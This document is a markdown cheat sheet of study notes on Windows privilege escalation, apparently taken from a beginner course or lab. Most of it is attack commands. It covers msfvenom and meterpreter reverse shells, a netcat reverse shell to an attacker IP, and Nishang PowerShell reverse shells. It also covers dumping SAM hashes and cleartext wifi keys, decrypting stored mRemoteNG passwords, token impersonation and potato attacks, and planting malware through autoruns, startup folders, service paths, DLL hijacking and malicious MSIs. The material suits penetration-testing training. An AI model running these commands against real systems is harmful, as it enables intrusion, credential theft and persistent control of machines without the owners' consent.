# Windows Privilege Escalation for Beginners

Resources: https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources

Fuzzy Security Guide: https://www.fuzzysecurity.com/tutorials/16.html

AllTheThings Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

## Gaining a Foothold (Box 1)

Connect to ftp
- `ftp [target-ip] -p [port]`

Establish a meterpreter webshell
- `msfvenom -p [payload] LHOST=[attacker-ip] LPORT=[attacker-port] -f [filetype] -o [output name]`
  - Payload examples
    - `windows/meterpreter/reverse_tcp`
    - `windows/x64/meterpreter/reverse_tcp`
    - `windows/reverse_tcp`
  - Filetype examples: `aspx`, `php`, `exe`, `py`
- `msfconsole`
  - `use exploit/multi/handler`
  - `set payload [payload]`

If the system is using `x86` / `32 bit` architecture
- `msfconsole`
- `search local_exploit_suggester`

## Initial Enumeration

### System Enumeration

Look at system info `sysinfo`.
- `systeminfo`
  - `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- `hostname`
- `wmic qfe`
  - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- `wmic logicaldisk get caption,description,providername`

### User Enumeration

Enumeration:
- `whoami`
  - `whoami /priv`
  - `whoami /groups`
- `net user`
  - `net user [name]`
- `net localgroup`
  - `net localgroup [group-name]`

### Network Enumeration

Enumeration:
- `ipconfig`
  - `ipconfig /all`
- `arp -a`
  - Can indicate what other machines are on the network
- `route print`
- `netstat -ano`

### Password Hunting

Passwords are sometimes found in files. Additionally, the SAM file is interesting and some passwords are stored in plaintext.
- Look inside the directory in files
  - `findstr /si password *.txt *.ini *.config`
- Wifi password: 
  - Get SSID: `netsh wlan show profile`
  - Get cleartext password: `netsh wlan show profile [SSID] key=clear`

Mounting .vhd files
- `sudo apt install libguestfs-tools`
- `guestmount --add [path].vhd --inspector --ro [placement-path]`

Dumping SAM hashes
- Find SAM in `C:\Windows\System32\config`
- Find SYSTEM in `C:\Windows\System32\config`
- `samdump2 [SYSTEM-path] [SAM-path]`

mRemoteNG program holds passwords
- Passwords stored in `C:\Users\[user]\Appdata\Roaming\mRemoteNG\confCons.xml`
- To crack: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py

### Anti-Virus Enumeration

Enumeration:
- Anti-virus: `sc query`
  - `sc query windefend`
  - `sc queryex type= service`
- Firewalls: 
  - `netsh advfirewall firewall dump`
  - `netsh firewall show state`
  - `netsh firewall show config`

## Automated tools

### Automated Tool Overview

Windows PrivEsec Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Executables:
- WinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS 
- Watson: https://github.com/rasta-mouse/Watson
- SharpUp: https://github.com/GhostPack/SharpUp
- Seatbelt: https://github.com/GhostPack/Seatbelt

Powershell:
- Sherlock: https://github.com/rasta-mouse/Sherlock
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- jaws-enum: https://github.com/411Hall/JAWS

Other:
- windows-exploit-suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Local Exploit Suggester: 
  - `msfconsole`
  - `search local_exploit_suggester`
  - In meterpreter shell: `run post/multi/recon/local_exploit_suggester`

## Escalation Path: Kernel Exploits

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

A kernel is a program that controls everything in the system and it facilitates the interactions between hardware and software.

- `ms10-015 kitrap0d`
- `ms10-059 Chimichurri`

## Escalation Path: Passwords and Port Forwarding

Be sure to analyse the systems active on all ports!
- `nmap -T4 -p- -sV [ip]`

Look for open ports that weren't found in the nmap scan
- `netstat -ano`

Hunting passwords:
- Looking in the registry can be a quick win
- Try to use all found credentials on all users

Trigger a port forward:
- `plink`: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
- `sudo apt install ssh`
- `nano /etc/ssh/sshd_config`
  - Enable `permit root login`
  - Possibly change the port.
- `service ssh restart`
- `service ssh start`
- `plink.exe -l [user] -pw [password] -R 445:127.0.0.1:445 [attacker-ip]`

Execute commands on a windows system:
- `winexe -U [user]%[password] //127.0.0.1 "cmd.exe"`
- Execute commands multiple times.

## Escalation Path: Windows Subsystem for Linux

Sending a crafted url payload to another account may have the user click on the malicious url.

Try to upload a webshell when you hav access to smb/ftp.

Enumerate smb: 
- `smbclient \\\\[ip]\\ -L`
- `smbclient -L [ip] -N`
- `smbmap -H [ip] -u 'null' --no-banner`
- `smbclient //[ip]/[share] -N`
- Mounting SMB shares:
  - `mount -t cifs //[ip]/[share] /mnt -o user=,password=`

Check all fields for SQL injection, code injection, XSS, etc...

Upgrading webshells:
- Linux: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- Windows: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
  - Append `Invoke-PowerShellTcp -Reverse -IPAddress [ip] -Port [port]` to the code
  - Capture a request in BurpSuite
  - Encode `powershell -ep bypass .\Invoke-PowerShellTcp.ps1`
- Alternative Windows method
  - `locate nc.exe`
  - `cp [path to nc.exe] ~`
  - `nc.exe [ip] [port] -e cmd.exe`

Escalate using WSL:
- Check where WSL is installed: `Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss |
%{Get-ItemProperty $_.PSPath} | out-string -width 4096`
- Locate to the found directory and go to the `root` directory "`rootfs`".
- Look inside the `.bash_history` file.

Alternative escalation method
- `where /R C:\ bash.exe`
- `where /R C:\ wsl.exe`
  - `wsl.exe whoami`
- `bash.exe`
  - Elevate to a tty shell if needed
    - `python -c "import pty;pty.spawn('/bin/bash')"`
    - TTY cheatsheet: https://netsec.ws/?p=337
  - `ls -la`
  - `history`
  - `sudo -l`

## Escalation Path: Impersonation and Potato Attacks

Shell
- `whoami /priv`

Meterpreter
- `getprivs`
- `load incognito`
- `list_tokens -u`
- `impersonate_token "[token]"`
- Migrate to a process run by the impersonated token
  - `ps` (Shows all processes)
  - `migrate [PID]`

Key common privileges
- SeAssignPrimaryToken/SeImpersonate
  - Run potato attack tools!
  - Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
  - Juicy Potato: https://github.com/ohpe/juicy-potato
    - Main source: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
- SeBackup
- SeCreateToken
- SeDebug
- SeRestore
- SeTakeOwnership

Jenkins:
- Manage Jenkins
  - Script console
- Run groovy reverse shell

To change shell into meterpreter shell:
- `msfconsole`
- `use exploit/multi/script/web_delivery`
- `targets`
  - `set target [language]`
- `options`
  - `set lhost`
  - `set lport`
  - `set srvhost`
  - `set payload [payload]`

Meterpreter
- `run post/[exploit]` to run in current session
  - `run post/multi/recon/local_exploit_suggester`

### Alternate Data Streams

Hidden information within a file.
- `dir /R`
- `more < [file]`

## Escalation Path: getsystem

https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

High chance of being detected: `getsystem -t 2`

Could crash a machine, so be careful!

## Escalation Path: Runas

Allows us to run a command as someone else.

Look for stored credentials: `cmdkey /list`
- Use `runas.exe` to download files
  - `C:\Windows\System32\runas.exe /user:[user] /savecred "C:\Windows\System32\cmd.exe /c TYPE [file directory] > [output directory]"`
- This effectively gives you a `sudo` command on the machine.

In ftp: `binary` when having issues transferring files

To read .mdb: `mdb-sql [file]`

To read .pst: `readpst [file]`

Enumerate to find credentials.

Use telnet: `telnet -l [username] [ip]`

## Escalation Path: Registry

### Autorun

In RDP:
- `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
- Check for access: 
  - ` C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "[path to file]"`

In shell:
- PowerUp
  - `powershell -ep bypass`
  - `. .\PowerUp.ps1`
  - Invoke-AllChecks

Changing shell
- `use multi/handler`
- `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [filetype] -o [output file]`
- Upload the malware to target device
- Use the malware from target device

Move the malware onto the machine and put it in the location of the autorun program.

Whenever a user logs in we gain a shell.

### AlwaysInstallElevated

Sometimes Windows MSI files have AlwaysInstallElevated set to 1.
- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`

In PowerUp (RDP required):
- Detects AlwaysInstallElevated running and gives a command to automatically create malicious MSI.

Through msfvenom.
- `msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f msi -o [output file]`
- Upload shell to machine
- `msiexec /quiet /qn /i [path to malicious MSI file]`

In meterpreter shell:
- `use post/exploit/windows/local/allways_install_elevated`

### regsvc ACL

FTP Server
- `python3 -m pyftpdlib -p 21 --write`

Powershell: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
- Requires: `NT AUTHORITY\INTERACTIVE Allow FullControl`

Exploitation:
- Add `cmd.exe /k net localgroup [group] [user] /add` to a service file
- `x86_64-w64-mingw32-gcc [service file] -o x.exe`
  - If not installed `sudo apt install gcc-mingw-w64`
- Put the service file in a writeable folder on the target
- `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [path to service file] /f`
- `sc start regsvc`

## Escalation Path: Executable Files

Run PowerUp.

Exploitation:
- Download malicious file onto the system by replacing it with the target executable file
- `sc start [service]`
- *Recommended to use malware that adds user to a group or creates a new privileged user instead of a shell, since the shell dies when the service starter times out.*

## Escalation Path: Startup Applications

To detect: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
- **F** means Full Access

Exploit:
- Download malware to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

## Escalation Path:  DLL Hijacking

Look for DLLs checks in a writeable path, where the DLL does not exist.

Place malware into the path that the service is looking for and
- `sc stop dllsvc`
- `sc start dllsvc`

## Escalation Path: Service Permissions (Paths)

For PowerUp, add `Invoke-AllChecks` to the last line of the file.

To find out what the service name is: `powershell -c Get-Service`

### Binary Paths

Service permissions
- `restart required`
- `sc config [service] binpath= "net localgroup [group] [username] /add"`
  - This can be an arbitrary command.

### Unquoted Service Paths

Unquoted service path
- Upload malware within the service path
- `sc start [service]`

## Escalation Path: CVE-2019-1388

URLs:
- https://www.youtube.com/watch?v=3BQKpPNlTSo
- https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388

Using `msfconsole` with `use exploit/multi/script/web_delivery` can sometimes easily upgrade your shell.